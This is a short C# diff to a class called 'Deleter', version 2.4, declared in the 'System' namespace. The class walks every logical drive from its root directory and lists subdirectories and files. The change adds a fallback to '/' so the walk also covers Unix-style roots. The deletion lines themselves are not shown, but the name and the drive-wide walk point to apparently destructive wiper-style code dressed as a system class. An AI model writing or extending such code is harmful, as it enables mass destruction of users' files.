@@ -2,7 +2,7 @@ namespace System
 {
     public static class Deleter
     {
-        public const System.String Ver = "2.3";
+        public const System.String Ver = "2.4";
         public const System.String Title = "Deleter v" + System.Deleter.Ver;
         public static System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
         public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
@@ -25,7 +25,12 @@ namespace System
                 }
                 foreach (System.String drive in System.Deleter.LogicalDrives)
                 {
-                    System.String[] dirs = System.IO.Directory.GetDirectories(System.IO.Directory.GetDirectoryRoot(drive));
+                    System.String root = System.IO.Directory.GetDirectoryRoot(drive);
+                    if (root == null || root == "")
+                    {
+                        root = "/";
+                    }
+                    System.String[] dirs = System.IO.Directory.GetDirectories(root);
                     foreach (System.String dir in dirs)
                     {
                         System.String[] files = System.IO.Directory.GetFiles(dir);
